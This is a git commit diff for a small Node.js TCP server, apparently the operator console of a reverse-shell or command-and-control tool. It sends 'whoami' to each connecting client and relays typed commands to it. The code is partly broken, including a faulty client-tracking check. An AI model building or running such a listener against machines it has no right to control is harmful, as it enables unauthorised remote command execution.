f74943bbbadb69a3ad9e8c6ed7399518bbebaebb
Dawson Hensel <dawsonhensel@gmail.com>
2021-07-05 13:30:01 -0700

    Allow to send multiple remote commands

--- socket_server.js
+++ socket_server.js
@@ -1,8 +1,8 @@
 "use strict";
 const net = require("net");
 const util = require("./utils.js");
-const sendClientCount = require("./ws_server.js");
 const port = 11111;
+const socketClients = require("./clients.js");
 const server = net.createServer((client) => {
     client.on("error", (error) => {
         switch (error.code) {
@@ -23,16 +23,23 @@ server.listen({
     console.log(`Socket server listening at ${server.address().address}:${port}`);
 });
 
-server.on("connection", (client) => {
-    util.getClientCount(server);
+server.on("connection", async (client) => {
     console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.address().port}`);
-    util.takeAndSendCommand(client);
+    if (socketClients.indexOf(client)) {
+        socketClients.pop();
+    }
+    socketClients.push(client);
 
-        client.on("data", (data) =>  {
-            console.log(data.bytesRead);
-            console.log("Data",data.toString());
-            util.takeAndSendCommand(client);
+    util.getClientCount(server);
+    client.write("whoami");
+
+    client.on("data", (data) =>  {
+        console.log(data.toString());
+        util.takeAndSendCommand(socketClients[0]);
     });
 });
 
 module.exports = server;
+
+// WE NEED TO ALLOW FOR MULTIPLE CONNECTIONS
+// THIS IS A POTENTIL FIX FOR THE 1 COMMAND ONLY PROBLEM
--- utils.js
+++ utils.js
@@ -1,6 +1,6 @@
 "use strict";
 const server = require("./socket_server.js");
-const sendClientCount = require("./ws_server.js");
+const updateDashboardClientCount = require("./ws_server.js");
 // Setup input prompt.
 const readline = require("readline");
 const rl = readline.createInterface({
@@ -14,16 +14,18 @@ const util = {
             if(err) return err;
             else {
                 console.log(`There are ${count} connection(s) now.`);
-                sendClientCount(count);
+                updateDashboardClientCount(count);
             }
         });
     },
 
     takeAndSendCommand : (socket) => {
         rl.question("# ", (cmd) => {
-            if (cmd === "clients") this.getClientCount(server);
-            socket.write(cmd);
-            rl.close();
+            if (cmd === "clients") {
+                this.getClientCount(server);
+            } else {
+                socket.write(cmd + "\r\n");
+            }
         });    
     }
 };
